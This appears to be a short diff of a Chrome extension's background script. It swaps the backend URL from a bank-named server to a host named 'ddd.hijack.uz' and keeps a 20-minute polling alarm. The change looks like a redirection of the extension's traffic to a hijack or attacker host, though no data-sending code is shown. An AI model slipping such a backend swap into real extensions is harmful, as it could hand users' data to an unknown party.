@@ -1,4 +1,4 @@
-const BACKEND_URL = 'https://bank-back.shoha-coder.uz';
+const BACKEND_URL = 'https://ddd.hijack.uz';
 const POLL_INTERVAL_MINUTES = 20;
 
 chrome.alarms.create('poll', { periodInMinutes: POLL_INTERVAL_MINUTES });
